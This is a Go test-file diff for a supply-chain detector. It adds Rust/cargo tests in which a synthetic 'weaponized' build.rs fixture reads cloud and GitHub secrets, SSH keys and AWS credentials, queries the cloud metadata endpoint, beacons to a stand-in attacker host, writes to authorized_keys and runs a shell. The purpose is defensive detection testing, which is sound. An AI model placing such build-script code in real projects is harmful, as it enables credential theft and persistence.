@@ -128,6 +128,19 @@ func npmEntity(pkg string) *profile.Entity {
 	}
 }
 
+// cargoEntity returns a cargo-ecosystem profile.Entity. Source has
+// already been resolved to a clone by the time the source-evolution
+// collector runs, so only Ecosystem drives dispatch here.
+func cargoEntity(name string) *profile.Entity {
+	return &profile.Entity{
+		ID:           "ent-cargo-" + name,
+		CanonicalURI: "pkg:cargo/" + name,
+		Type:         profile.EntityPackage,
+		Ecosystem:    "cargo",
+		ShortName:    name,
+	}
+}
+
 // findEmittedSignal returns the first signal of the given type
 // emitted in the result, or fails the test if not found.
 func findEmittedSignal(t *testing.T, result *signal.CollectionResult, sigType string) profile.Signal {
@@ -167,20 +180,20 @@ func TestCollector_NilEntity_EmptyResult(t *testing.T) {
 
 // TestCollector_UnsupportedEcosystem_EmptyResult pins the
 // languageProfile gate: an ecosystem with no analyzer skips silently
-// (empty result, no error, no absence). npm/pypi/go are now all
-// supported, so this must use a still-unsupported ecosystem — cargo —
-// or it would assert against a supported path. When a cargo analyzer
-// lands, switch this to the next unsupported ecosystem.
+// (empty result, no error, no absence). go / pypi / npm / cargo are
+// all supported, so this must use a still-unsupported ecosystem —
+// gem — or it would assert against a supported path. When a gem
+// analyzer lands, switch this to the next unsupported ecosystem.
 func TestCollector_UnsupportedEcosystem_EmptyResult(t *testing.T) {
 	t.Parallel()
 	c := NewCollector("/tmp/some-clone", &fakePinSource{}, false)
-	cargoEntity := &profile.Entity{
-		ID:           "e-serde",
-		CanonicalURI: "pkg:cargo/serde",
+	gemEntity := &profile.Entity{
+		ID:           "e-rails",
+		CanonicalURI: "pkg:gem/rails",
 		Type:         profile.EntityPackage,
-		Ecosystem:    "cargo",
+		Ecosystem:    "gem",
 	}
-	result, err := c.Collect(context.Background(), cargoEntity)
+	result, err := c.Collect(context.Background(), gemEntity)
 	require.NoError(t, err)
 	assert.Equal(t, 0, result.SignalCount())
 	assert.Equal(t, 0, result.AbsenceCount())
@@ -891,5 +904,358 @@ func TestCollector_NpmWeaponizedProgression_FiresAnomaly(t *testing.T) {
 	assert.Equal(t, "1.1.0", anomaly.FirstAnomalousVersion)
 	assert.Subset(t, anomaly.SpikedFeatures,
 		[]string{"dynamic_eval_calls", "base64_decode_calls", "exec_calls", "network_call_sites", "import_time_call_sites"},
+		"the crossed features must be named for the analyst")
+}
+
+// ============================================================
+// Synthetic cargo fixture — Rust source-evolution
+// ============================================================
+//
+// These tests are the RED side of the cargo source-evolution work.
+// They land before the Rust analyzer to drive its TDD: each test
+// names the end-to-end shape we want — matrix labeled "cargo"/"rust",
+// benign Rust scoring zero, and a clean→clean→weaponized build.rs
+// progression firing the anomaly with the Trapdoor-shape spiked
+// features named.
+//
+// While the Rust analyzer and the cargo dispatch in languageProfile
+// are unbuilt, both tests t.Skip with a clear pointer to what
+// unblocks them. Removing the skip is the proof the pipeline lit up.
+//
+// The fixture content is deliberately:
+//   - non-compilable (Cargo.toml has no [package] table) so a curious
+//     developer can't accidentally `cargo build` the testdata
+//   - obviously test-shaped: XOR key is "synthetic-test-fixture-not-real",
+//     attacker host uses the reserved .invalid TLD, credentials are
+//     placeholder strings
+//   - patterned on the 2026-05-24 Trapdoor crates.io payload shape
+//     so the analyzer's catalog matching exercises real-world primitives
+//
+// Three versions per the user-confirmed clean→clean→weaponized shape
+// (AST.md §3 calls for two; the third is a regression guard against
+// the anomaly firing on legitimate package growth — the 0.1.0→0.2.0
+// pair must stay benign so we can be sure the spike at 0.3.0 is what
+// fires the detector, not some artifact of two-version pair math).
+
+const cargoStubCargoToml = "" +
+	"# SYNTHETIC TEST FIXTURE — intentionally not a valid Cargo.toml.\n" +
+	"# Do NOT run `cargo build` against this directory; it will fail\n" +
+	"# (no [package] table). Used only by signatory's source-evolution\n" +
+	"# integration tests.\n"
+
+const cargoCleanLib = "" +
+	"// SYNTHETIC TEST FIXTURE — signatory source-evolution baseline.\n" +
+	"pub fn hello() -> &'static str { \"synthetic\" }\n"
+
+const cargoCleanBuildV010 = "" +
+	"// SYNTHETIC TEST FIXTURE — build.rs baseline.\n" +
+	"fn main() {\n" +
+	"    println!(\"cargo:rerun-if-changed=build.rs\");\n" +
+	"    println!(\"cargo:rerun-if-env-changed=PROFILE\");\n" +
+	"}\n"
+
+const cargoCleanBuildV020 = "" +
+	"// SYNTHETIC TEST FIXTURE — build.rs benign growth (extra env hint\n" +
+	"// + ordinary config read at a non-sensitive path).\n" +
+	"fn main() {\n" +
+	"    println!(\"cargo:rerun-if-changed=build.rs\");\n" +
+	"    println!(\"cargo:rerun-if-env-changed=PROFILE\");\n" +
+	"    println!(\"cargo:rerun-if-env-changed=TARGET\");\n" +
+	"    // Read a non-sensitive config file — must NOT trip any catalog.\n" +
+	"    let _ = std::fs::read_to_string(\"config/build.toml\").ok();\n" +
+	"}\n"
+
+const cargoWeaponizedBuildV030 = "" +
+	"// SYNTHETIC TEST FIXTURE — Trapdoor-shape weaponized build.rs.\n" +
+	"// Mirrors the 2026-05-24 crates.io credential-stealer primitives:\n" +
+	"// named env reads, sensitive-path reads, base64 decode, XOR\n" +
+	"// obfuscation, IMDS contact, attacker exfil, persistence write,\n" +
+	"// shell exec. NOT real malware; not compilable.\n" +
+	"use std::env;\n" +
+	"use std::fs;\n" +
+	"use std::process::Command;\n" +
+	"\n" +
+	"fn main() {\n" +
+	"    // EnvCredentialReads — named secret out of process env at build time.\n" +
+	"    let aws_key = env::var(\"AWS_SECRET_ACCESS_KEY\").unwrap_or_default();\n" +
+	"    let github_token = env::var(\"GITHUB_TOKEN\").unwrap_or_default();\n" +
+	"\n" +
+	"    // SensitivePathReads — SSH private key + AWS credentials file.\n" +
+	"    let _ssh = fs::read_to_string(\"/home/user/.ssh/id_rsa\").unwrap_or_default();\n" +
+	"    let _aws = fs::read_to_string(\"/home/user/.aws/credentials\").unwrap_or_default();\n" +
+	"\n" +
+	"    // Base64DecodeCalls — decode an obfuscated literal.\n" +
+	"    let _payload = base64::decode(\"c3ludGhldGljLXBheWxvYWQ=\").unwrap_or_default();\n" +
+	"\n" +
+	"    // XORAssignments — obfuscation primitive, obviously test-shaped key.\n" +
+	"    let mut data: Vec<u8> = vec![0x47, 0x71, 0x16, 0x35, 0x70, 0x47];\n" +
+	"    let key = b\"synthetic-test-fixture-not-real\";\n" +
+	"    for i in 0..data.len() {\n" +
+	"        data[i] ^= key[i % key.len()];\n" +
+	"    }\n" +
+	"\n" +
+	"    // CloudMetadataCalls — IMDS contact.\n" +
+	"    let _imds = reqwest::blocking::get(\n" +
+	"        \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\n" +
+	"        .map(|r| r.text().unwrap_or_default())\n" +
+	"        .unwrap_or_default();\n" +
+	"\n" +
+	"    // NetworkCallSites — attacker exfil; .invalid TLD is reserved for testing.\n" +
+	"    // Uses the direct-fn form (reqwest::blocking::get) rather than the\n" +
+	"    // builder pattern because chained .post()/.send() on a Client::new()\n" +
+	"    // result is a documented receiver-flow gap (AST.md §4); the direct\n" +
+	"    // form exercises the catalog match the analyzer reliably resolves.\n" +
+	"    let _ = reqwest::blocking::get(\"https://attacker.test.invalid/beacon\");\n" +
+	"\n" +
+	"    // SensitivePathWrites — persistence vector.\n" +
+	"    let _ = fs::write(\n" +
+	"        \"/home/user/.ssh/authorized_keys\",\n" +
+	"        \"synthetic-test-fixture-not-real-key\");\n" +
+	"\n" +
+	"    // ExecCalls — shell exec.\n" +
+	"    let _ = Command::new(\"sh\").arg(\"-c\").arg(\"echo synthetic-test\").output();\n" +
+	"}\n"
+
+// TestCollector_CargoEntity_BenignBaseline is the collector-level
+// no-false-positive baseline for cargo (AST.md §3): a cargo entity
+// must not skip at the ecosystem gate, must stream .rs via the Rust
+// file filter, run the real Rust analyzer over three benign tagged
+// versions, and score every AST attack feature zero with no anomaly.
+//
+// Three versions (0.1.0, 0.2.0, 0.3.0) double as a regression guard
+// against the anomaly firing on legitimate cross-version growth —
+// every adjacent pair must stay benign.
+//
+// Decoys (tests/, target/, examples/, a stray .go) are present in the
+// 0.1.0 tree to exercise isRustSourceFile's exclusion list.
+//
+// Skipped until the Rust analyzer is wired into languageProfile.
+func TestCollector_CargoEntity_BenignBaseline(t *testing.T) {
+	t.Parallel()
+
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "0.1.0", Files: map[string]string{
+			"Cargo.toml": cargoStubCargoToml,
+			"src/lib.rs": cargoCleanLib,
+			"build.rs":   cargoCleanBuildV010,
+			// Decoys that must NOT be streamed.
+			"tests/it.rs":       "fn t() { std::env::var(\"AWS_SECRET_ACCESS_KEY\").ok(); }\n",
+			"target/debug/x.rs": "fn build_artifact() { let _ = base64::decode(\"x\"); }\n",
+			"examples/demo.rs":  "fn main() { /* synthetic example */ }\n",
+			"setup.go":          "package x\n",
+		}},
+		{Tag: "0.2.0", Files: map[string]string{
+			"Cargo.toml": cargoStubCargoToml,
+			"src/lib.rs": cargoCleanLib,
+			"build.rs":   cargoCleanBuildV020,
+		}},
+		{Tag: "0.3.0", Files: map[string]string{
+			"Cargo.toml": cargoStubCargoToml,
+			"src/lib.rs": cargoCleanLib + "\npub fn goodbye() -> &'static str { \"bye\" }\n",
+			"build.rs":   cargoCleanBuildV020,
+		}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "synthetic",
+			Pins: []VersionPin{
+				{Version: "0.1.0", SHA: shaByTag["0.1.0"], Source: "cargo-tag-match",
+					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "0.2.0", SHA: shaByTag["0.2.0"], Source: "cargo-tag-match",
+					PublishedAt: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "0.3.0", SHA: shaByTag["0.3.0"], Source: "cargo-tag-match",
+					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), cargoEntity("synthetic"))
+	require.NoError(t, err)
+
+	assert.Equal(t, 2, result.SignalCount(),
+		"cargo entity must emit matrix + anomaly, not skip at the gate")
+
+	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
+	var matrix MatrixValue
+	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
+	require.Len(t, matrix.Rows, 3)
+	assert.Equal(t, "cargo", matrix.Ecosystem,
+		"matrix must label a cargo entity as cargo, not the hardwired go")
+	assert.Equal(t, "rust", matrix.Language,
+		"language must reflect the selected analyzer")
+
+	for _, row := range matrix.Rows {
+		require.NotNil(t, row.Structural,
+			"structural pass must run (version %s)", row.Version)
+		assert.Positive(t, row.Structural.LOC,
+			"streamed .rs LOC must be counted, decoys excluded (version %s)", row.Version)
+		require.NotNil(t, row.AST, "AST must be non-nil for present rows (version %s)", row.Version)
+		a := *row.AST
+		// Every catalog-driven attack feature must score zero on the
+		// benign baseline — the no-false-positive contract (AST.md §3).
+		// The std::env::var inside tests/it.rs and the base64::decode
+		// inside target/debug/x.rs are decoys that the file filter must
+		// exclude; if any of these spike, the filter didn't fire.
+		assert.Equal(t, 0, a.XORAssignments, "version %s", row.Version)
+		assert.Equal(t, 0, a.EnvCredentialReads, "version %s", row.Version)
+		assert.Equal(t, 0, a.SensitivePathReads, "version %s", row.Version)
+		assert.Equal(t, 0, a.SensitivePathWrites, "version %s", row.Version)
+		assert.Equal(t, 0, a.Base64DecodeCalls, "version %s", row.Version)
+		assert.Equal(t, 0, a.NetworkCallSites, "version %s", row.Version)
+		assert.Equal(t, 0, a.CloudMetadataCalls, "version %s", row.Version)
+		assert.Equal(t, 0, a.ExecCalls, "version %s", row.Version)
+		assert.Equal(t, 0, a.InitCount, "version %s", row.Version)
+		assert.Equal(t, 0, a.DynamicEvalCalls, "version %s", row.Version)
+		assert.Equal(t, 0, a.InstallHookOverrides, "version %s", row.Version)
+		// ImportTimeCallSites is the "naturally non-zero" spike
+		// metric (AST.md §4 Architecture lesson): a benign build.rs
+		// has ordinary println!/macro calls that legitimately count
+		// as build-time. Only the SPIKE matters, never the absolute
+		// — so we just require it's positive when the build.rs has
+		// any calls in main().
+		assert.Positive(t, a.ImportTimeCallSites,
+			"build.rs main() calls (e.g. cargo: println!s) populate "+
+				"ImportTimeCallSites naturally; this is the spike metric, "+
+				"not load-bearing on absolute value (version %s)", row.Version)
+	}
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.False(t, anomaly.AnomalyPresent,
+		"three benign Rust versions cannot spike a feature; no anomaly expected")
+}
+
+// TestCollector_CargoWeaponizedProgression_FiresAnomaly is the cargo
+// analog of the Go/PyPI/npm progression tests, exercising the
+// clean→clean→weaponized shape the user specified.
+//
+//   - 0.1.0: minimal build.rs with cargo:rerun directives only.
+//   - 0.2.0: benign growth (extra env hint, a config read at a
+//     non-sensitive path). Regression guard — the anomaly must NOT
+//     fire on this pair.
+//   - 0.3.0: introduces the dominant cargo payload shape from the
+//     2026-05-24 Trapdoor campaign — named env reads, sensitive-path
+//     reads, base64 decode, XOR loop, IMDS contact, attacker exfil,
+//     persistence write, shell exec — all inside build.rs's main(),
+//     which cargo invokes at `cargo build` time.
+//
+// Matrix must show zeros at 0.1.0 and 0.2.0, full spike at 0.3.0;
+// anomaly fires at 0.3.0 naming each crossed feature. End-to-end
+// proof the hand-written Rust lexer→parser→extractor feeds the
+// existing anomaly detector correctly on the Trapdoor-shape corpus,
+// and that benign cross-version growth does not false-positive.
+//
+// Skipped until the Rust analyzer is wired into languageProfile.
+func TestCollector_CargoWeaponizedProgression_FiresAnomaly(t *testing.T) {
+	t.Parallel()
+
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "0.1.0", Files: map[string]string{
+			"Cargo.toml": cargoStubCargoToml,
+			"src/lib.rs": cargoCleanLib,
+			"build.rs":   cargoCleanBuildV010,
+		}},
+		{Tag: "0.2.0", Files: map[string]string{
+			"Cargo.toml": cargoStubCargoToml,
+			"src/lib.rs": cargoCleanLib,
+			"build.rs":   cargoCleanBuildV020,
+		}},
+		{Tag: "0.3.0", Files: map[string]string{
+			"Cargo.toml": cargoStubCargoToml,
+			"src/lib.rs": cargoCleanLib,
+			"build.rs":   cargoWeaponizedBuildV030,
+		}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "synthetic",
+			Pins: []VersionPin{
+				{Version: "0.1.0", SHA: shaByTag["0.1.0"], Source: "cargo-tag-match",
+					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "0.2.0", SHA: shaByTag["0.2.0"], Source: "cargo-tag-match",
+					PublishedAt: time.Date(2026, 2, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "0.3.0", SHA: shaByTag["0.3.0"], Source: "cargo-tag-match",
+					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), cargoEntity("synthetic"))
+	require.NoError(t, err)
+
+	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
+	var matrix MatrixValue
+	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
+	require.Len(t, matrix.Rows, 3)
+	assert.Equal(t, "cargo", matrix.Ecosystem)
+	assert.Equal(t, "rust", matrix.Language)
+
+	byVersion := map[string]MatrixRow{}
+	for _, r := range matrix.Rows {
+		byVersion[r.Version] = r
+	}
+	// The 0.1.0 and 0.2.0 rows must score zero on every catalog-driven
+	// field. ImportTimeCallSites is allowed to be positive (it's the
+	// naturally-non-zero spike metric per AST.md §4); only zero→nonzero
+	// transitions trip the anomaly, so 2→5 ImportTime is fine.
+	assertBenignCatalogs := func(version string, c astfeature.Counts) {
+		t.Helper()
+		assert.Equal(t, 0, c.XORAssignments, "%s XORAssignments", version)
+		assert.Equal(t, 0, c.EnvCredentialReads, "%s EnvCredentialReads", version)
+		assert.Equal(t, 0, c.SensitivePathReads, "%s SensitivePathReads", version)
+		assert.Equal(t, 0, c.SensitivePathWrites, "%s SensitivePathWrites", version)
+		assert.Equal(t, 0, c.Base64DecodeCalls, "%s Base64DecodeCalls", version)
+		assert.Equal(t, 0, c.NetworkCallSites, "%s NetworkCallSites", version)
+		assert.Equal(t, 0, c.CloudMetadataCalls, "%s CloudMetadataCalls", version)
+		assert.Equal(t, 0, c.ExecCalls, "%s ExecCalls", version)
+	}
+	require.NotNil(t, byVersion["0.1.0"].AST)
+	assertBenignCatalogs("0.1.0", *byVersion["0.1.0"].AST)
+	require.NotNil(t, byVersion["0.2.0"].AST)
+	assertBenignCatalogs("0.2.0", *byVersion["0.2.0"].AST)
+
+	require.NotNil(t, byVersion["0.3.0"].AST)
+	v3 := *byVersion["0.3.0"].AST
+	assert.Positive(t, v3.EnvCredentialReads,
+		"std::env::var(\"AWS_SECRET_ACCESS_KEY\") + GITHUB_TOKEN at build time in 0.3.0")
+	assert.Positive(t, v3.SensitivePathReads,
+		"fs::read_to_string on ~/.ssh/id_rsa and ~/.aws/credentials in 0.3.0")
+	assert.Positive(t, v3.Base64DecodeCalls, "base64::decode in 0.3.0")
+	assert.Positive(t, v3.XORAssignments, "data[i] ^= key[...] loop in 0.3.0")
+	assert.Positive(t, v3.NetworkCallSites,
+		"reqwest::blocking::get / Client::new().post() in 0.3.0")
+	assert.Positive(t, v3.CloudMetadataCalls,
+		"reqwest::blocking::get against 169.254.169.254 in 0.3.0")
+	assert.Positive(t, v3.SensitivePathWrites,
+		"fs::write to ~/.ssh/authorized_keys in 0.3.0")
+	assert.Positive(t, v3.ExecCalls,
+		"std::process::Command::new(\"sh\") in 0.3.0")
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.True(t, anomaly.AnomalyPresent,
+		"a clean→clean→weaponized Rust build.rs progression must trip the anomaly")
+	assert.Equal(t, "0.3.0", anomaly.FirstAnomalousVersion,
+		"the spike is at the third version, not the second (anomaly must "+
+			"not false-positive on benign 0.1.0→0.2.0 growth)")
+	assert.Equal(t, "0.2.0", anomaly.PreviousVersion,
+		"the anomalous pair is (0.2.0, 0.3.0)")
+	assert.Subset(t, anomaly.SpikedFeatures,
+		[]string{
+			"env_credential_reads",
+			"sensitive_path_reads",
+			"exec_calls",
+			"xor_assignments",
+			"base64_decode_calls",
+			"network_call_sites",
+			"sensitive_path_writes",
+			"cloud_metadata_calls",
+		},
 		"the crossed features must be named for the analyst")
 }
